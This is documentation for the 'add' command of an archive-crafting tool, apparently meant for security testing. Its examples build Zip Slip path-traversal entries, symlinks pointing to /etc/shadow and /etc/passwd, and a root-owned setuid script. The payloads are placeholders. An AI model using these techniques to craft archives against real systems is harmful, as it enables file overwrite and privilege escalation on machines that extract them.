# Archive Alchemist: add Command

## Overview

The `add` command adds files, directories, symlinks, or hardlinks to an archive. It's one of the most versatile commands in Archive Alchemist, allowing you to craft archives with various file types and properties.

## Syntax

```bash
./archive-alchemist.py <archive> [-t <type>] add <path> [options]
```

## Options

| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `<path>` | Path within the archive (required) | N/A | `file.txt`, `dir/file.js`, `../etc/passwd` |
| `--content` | Text content to add to the file | Empty | `--content "console.log('hello')"` |
| `--content-file` | Path to a local file whose content should be added | None | `--content-file /path/to/local/file.txt` |
| `--content-directory` | Path to a local directory to add recursively | None | `--content-directory /path/to/local/dir` |
| `--symlink` | Create a symlink to this target | None | `--symlink "/etc/passwd"` |
| `--hardlink` | Create a hardlink to this target | None | `--hardlink "target.txt"` |
| `--mode` | File mode in octal notation | 0644 for files<br>0755 for directories | `--mode 0755` |
| `--uid` | User ID | Current user | `--uid 0` |
| `--gid` | Group ID | Current group | `--gid 0` |
| `--mtime` | Modification time (Unix timestamp) | Current time | `--mtime 1609459200` |
| `--setuid` | Set the setuid bit | False | `--setuid` |
| `--setgid` | Set the setgid bit | False | `--setgid` |
| `--sticky` | Set the sticky bit | False | `--sticky` |
| `--unicodepath` | Set the unicode path (ZIP only) | None | `--unicodepath something.txt` |

**Note**: You can specify only one of `--content`, `--content-file`, `--content-directory`, `--symlink`, or `--hardlink`.

## Examples

### Adding a Regular File

```bash
# Add a file with inline content
./archive-alchemist.py archive.zip add hello.js --content "console.log('hello')"

# Add a file with content from another file
./archive-alchemist.py archive.zip add config.json --content-file /path/to/local/config.json
```

### Adding Files with Path Traversal

```bash
# Add a file with a path traversal pattern
./archive-alchemist.py archive.tar -t tar add "../../../etc/passwd" --content "fake passwd file"
```

### Adding Files with Special Permission Bits

```bash
# Add a file with executable permissions
./archive-alchemist.py archive.tar -t tar add exploit.sh --content "#!/bin/sh\necho hacked" --mode 0755

# Add a file with setuid bit
./archive-alchemist.py archive.tar -t tar add setuid_exploit --content "#!/bin/sh\nwhoami" --mode 0755 --setuid --uid 0

# Add a file with sticky bit
./archive-alchemist.py archive.zip add sticky_directory/ --content "sticky directory" --mode 0777 --sticky
```

### Adding Symlinks

```bash
# Add a symlink to an absolute path
./archive-alchemist.py archive.tar -t tar add evil.conf --symlink "/etc/shadow"

# Add a symlink to a relative path
./archive-alchemist.py archive.zip add relative_link.txt --symlink "../sensitive.txt"
```

### Adding Hardlinks (TAR only)

```bash
# Add a hardlink to another file in the archive
./archive-alchemist.py archive.tar -t tar add hardlink.txt --hardlink "original.txt"
```

**Note**: ZIP format doesn't support true hardlinks. When adding a hardlink to a ZIP file, Archive Alchemist creates a regular file with the target path as its content.

### Adding an Entire Directory Structure

```bash
# Add a directory structure recursively
./archive-alchemist.py archive.zip add website/ --content-directory /path/to/local/website

# Add a directory with custom permissions
./archive-alchemist.py archive.tar -t tar add backup/ --content-directory /etc/config --mode 0600
```

When using `--content-directory`:
- File permissions are preserved from the source directory unless overridden with `--mode`
- Directory structure and empty directories are maintained
- Symlinks in the source directory are added as symlinks in the archive
- If a file already exists in the archive, it will be overwritten with the new content

## Advanced Examples

### Creating a Zip Slip Payload

```bash
# Create a zip with path traversal payload
./archive-alchemist.py zipslip.zip add "../../../tmp/evil.txt" --content "I escaped the extraction directory!"
```

### Creating a Symlink Attack

```bash
# Create a symlink pointing to a sensitive file
./archive-alchemist.py symlink_attack.tar -t tar add .bashrc --symlink "/etc/passwd"
```

### Creating a Setuid Executable

```bash
# Create a setuid executable owned by root
./archive-alchemist.py setuid_attack.tar -t tar add exploit --content "#!/bin/sh\nwhoami" --mode 0755 --setuid --uid 0
```

### Setting Custom Timestamps

```bash
# Add a file with a specific modification time (January 1, 2021)
./archive-alchemist.py archive.zip add old_file.txt --content "Old content" --mtime 1609459200
```

## Notes and Warnings

- The `--setuid`, `--setgid`, and `--sticky` permission bits are only meaningful in Unix/Linux systems. Windows systems will ignore these bits.

- ZIP archives have limitations regarding Unix permissions and special file types like symlinks. These are implemented using ZIP extension fields and may not be recognized by all ZIP utilities.